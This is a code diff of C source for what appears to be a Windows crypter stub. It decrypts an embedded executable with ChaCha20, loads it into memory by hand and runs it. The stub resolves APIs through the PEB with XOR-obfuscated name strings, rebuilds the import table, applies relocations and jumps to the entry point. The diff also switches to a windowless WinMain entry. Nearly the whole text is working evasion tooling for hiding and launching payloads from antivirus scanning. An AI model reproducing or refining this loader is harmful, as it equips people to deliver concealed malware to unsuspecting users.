@@ -10,34 +10,34 @@ char sGetProcAddress[] = { 0x68, 0xe1, 0x6c, 0xde, 0x61, 0xc5, 0x2a, 0xac, 0xc3,
 char sVirtualAlloc[] = { 0x79, 0xed, 0x6a, 0xfa, 0x66, 0xcb, 0x25, 0xac, 0xcb, 0x3b, 0xb5, 0x48, 0xf4 };
 char sLoadLibraryA[] = { 0x63, 0xeb, 0x79, 0xea, 0x5f, 0xc3, 0x2b, 0x9f, 0xc6, 0x25, 0xa3, 0x6a, 0xf4 };
 char sExitProcess[] = { 0x6a, 0xfc, 0x71, 0xfa, 0x43, 0xd8, 0x26, 0x8e, 0xc2, 0x24, 0xa9, 0x2b };
-uint64_t* (*xGetProcAddress)(void*, uint8_t*) = NULL;
-uint64_t* (*xVirtualAlloc)(void*, SIZE_T, DWORD, DWORD) = NULL;
+void* (*xGetProcAddress)(void*, uint8_t*) = NULL;
+void* (*xVirtualAlloc)(void*, SIZE_T, DWORD, DWORD) = NULL;
 void* (*xLoadLibraryA)(uint8_t*) = NULL;
 void (*xExitProcess)(UINT) = NULL;
 
-int main(int argc, char* argv[])
+int WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
 {
 	void* exe = NULL;
 	uint8_t* program = NULL;
 	chacha20_ctx ctx;
 	PIMAGE_OPTIONAL_HEADER opHeader;
 	PIMAGE_SECTION_HEADER section;
-	PIMAGE_IMPORT_DESCRIPTOR import;
 
 	// find kernel32.dll
 	PPEB peb = *(PPEB*)(_readgsbase_u64() + 0x60);
 	PPEB_LDR_DATA ldr = peb->Ldr;
 	PLIST_ENTRY modules = ldr->InMemoryOrderModuleList.Flink;
 	PLIST_ENTRY thisImage = modules->Flink;
-	uint8_t* ntdll = thisImage->Flink;
+	uint8_t* ntdll = (uint8_t*)thisImage->Flink;
 	uint8_t* kernel32 = *(uint8_t**)(ntdll + (sizeof(PVOID) * 4));
 	
 	// find GetProcAddress
 	ntHeader = (PIMAGE_NT_HEADERS)((uint8_t*)kernel32 + ((IMAGE_DOS_HEADER*)kernel32)->e_lfanew);
 	opHeader = &ntHeader->OptionalHeader;
 	IMAGE_DATA_DIRECTORY etable = opHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
-	PIMAGE_EXPORT_DIRECTORY exports = kernel32 + etable.VirtualAddress;
+	PIMAGE_EXPORT_DIRECTORY exports = (void*)(kernel32 + etable.VirtualAddress);
 
+	// decrypt function name strings
 	for (int i = 0; i < sizeof(sGetProcAddress); i++)
 	{
 		sGetProcAddress[i] ^= xorKey[i];
@@ -55,9 +55,10 @@ int main(int argc, char* argv[])
 		sExitProcess[i] ^= xorKey[i];
 	}
 
-	uint32_t* exportFunc = kernel32 + exports->AddressOfFunctions;
-	uint32_t* exportName = kernel32 + exports->AddressOfNames;
-	uint16_t* exportOrdinal = kernel32 + exports->AddressOfNameOrdinals;
+	// find GetProcAddress in exports of kernel32.dll
+	uint32_t* exportFunc = (void*)(kernel32 + exports->AddressOfFunctions);
+	uint32_t* exportName = (void*)(kernel32 + exports->AddressOfNames);
+	uint16_t* exportOrdinal = (void*)(kernel32 + exports->AddressOfNameOrdinals);
 
 	for (uint16_t i = 0; i < exports->NumberOfNames; i++)
 	{
@@ -80,7 +81,7 @@ int main(int argc, char* argv[])
 		{
 			uint32_t rva = exportFunc[exportOrdinal[i]];
 
-			xGetProcAddress = kernel32 + rva;
+			xGetProcAddress = (void*)(kernel32 + rva);
 		}
 	}
 
@@ -128,10 +129,10 @@ int main(int argc, char* argv[])
 
 	// load sections
 	section = IMAGE_FIRST_SECTION(ntHeader);
-	for (int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++)
+	for (DWORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++)
 	{
 		// memcpy
-		for (int j = 0; j < section->SizeOfRawData; j++)
+		for (DWORD j = 0; j < section->SizeOfRawData; j++)
 		{
 			(program + section->VirtualAddress)[j] = ((uint8_t*)exe + section->PointerToRawData)[j];
 		}
@@ -145,63 +146,61 @@ int main(int argc, char* argv[])
 	DWORD itableOffset = offset(itable.VirtualAddress, section);
 	if (itable.Size)
 	{
-		for (PIMAGE_IMPORT_DESCRIPTOR i = (uint8_t*)exe + itableOffset; i->Name; i++)
+		for (PIMAGE_IMPORT_DESCRIPTOR i = (void*)((uint8_t*)exe + itableOffset); i->Name; i++)
 		{
 			HMODULE module = xLoadLibraryA((uint8_t*)exe + offset(i->Name, section));
 			if (!module) xExitProcess(1);
 
 			// 64 bit
 			int k = 0;
-			for (uint64_t* j = (uint8_t*)exe + offset(i->Characteristics, section); *j; j++, k++)
+			for (uint64_t* j = (void*)((uint8_t*)exe + offset(i->Characteristics, section)); *j; j++, k++)
 			{
-				FARPROC importFunc;
+				void* importFunc;
 
 				if (*j & 0x8000000000000000) // if importing by ordinal
 				{
-					importFunc = xGetProcAddress(module, *j & 0xFFFF);
+					importFunc = xGetProcAddress(module, (uint8_t*)(*j & 0xFFFF));
 				}
 				else
 				{
-					PIMAGE_IMPORT_BY_NAME hint = (uint8_t*)exe + offset(*j & 0xFFFFFFFF, section);
+					PIMAGE_IMPORT_BY_NAME hint = (void*)((uint8_t*)exe + offset(*j & 0xFFFFFFFF, section));
 
-					importFunc = xGetProcAddress(module, &hint->Name);
+					importFunc = xGetProcAddress(module, (uint8_t*)&hint->Name);
 				}
 
-				((uint64_t*)(program + i->FirstThunk))[k] = importFunc;
+				((uint64_t*)(program + i->FirstThunk))[k] = (uint64_t)importFunc;
 			}
 		}
 	}
 	
 	// fix relocations
-	int64_t aslr = program - opHeader->ImageBase;
+	int64_t aslrOffset = (uint64_t)program - opHeader->ImageBase;
 
 	IMAGE_DATA_DIRECTORY rtable = opHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
-	uint16_t rtableOffset = offset(rtable.VirtualAddress, section);
-	uint64_t rtableEnd = (uint8_t*)exe + rtableOffset + rtable.Size;
+	DWORD rtableOffset = offset(rtable.VirtualAddress, section);
+	PIMAGE_BASE_RELOCATION rtableEnd = (void*)((uint8_t*)exe + rtableOffset + rtable.Size);
 	if (rtable.Size)
 	{
-		for (PIMAGE_BASE_RELOCATION i = (uint8_t*)exe + rtableOffset; i < rtableEnd; (uint8_t*)i += i->SizeOfBlock)
+		for (PIMAGE_BASE_RELOCATION i = (void*)((uint8_t*)exe + rtableOffset);
+			i < rtableEnd;
+			(uint8_t*)i += i->SizeOfBlock)
 		{
-			uint16_t* reloc = (uint8_t*)i + sizeof(IMAGE_BASE_RELOCATION);
+			uint16_t* reloc = (void*)((uint8_t*)i + sizeof(IMAGE_BASE_RELOCATION));
 
-			for (uint16_t* j = reloc; j < reloc + i->SizeOfBlock; j++)
+			for (uint16_t* j = reloc; j < (uint16_t*)((uint8_t*)i + i->SizeOfBlock); j++)
 			{
-				uint16_t relocOffset = offset(i->VirtualAddress + (*j & 0xFFF), section);
+				DWORD relocOffset = i->VirtualAddress + (*j & 0xFFF);
 
-				if ((*j >> 12 == IMAGE_REL_BASED_HIGHLOW))
+				if (*j >> 12 == IMAGE_REL_BASED_DIR64)
 				{
-					*(uint32_t*)(program + relocOffset) += aslr;
-				}
-				else if (*j >> 12 == IMAGE_REL_BASED_DIR64)
-				{
-					*(uint64_t*)(program + relocOffset) += aslr;
+					*(uint64_t*)(program + relocOffset) += aslrOffset;
 				}
 			}
 		}
 	}
 
 	// execute decrypted program
-	void (*binary)() = program + opHeader->AddressOfEntryPoint;
+	void (*binary)() = (void*)(program + opHeader->AddressOfEntryPoint);
 
 	binary();
 
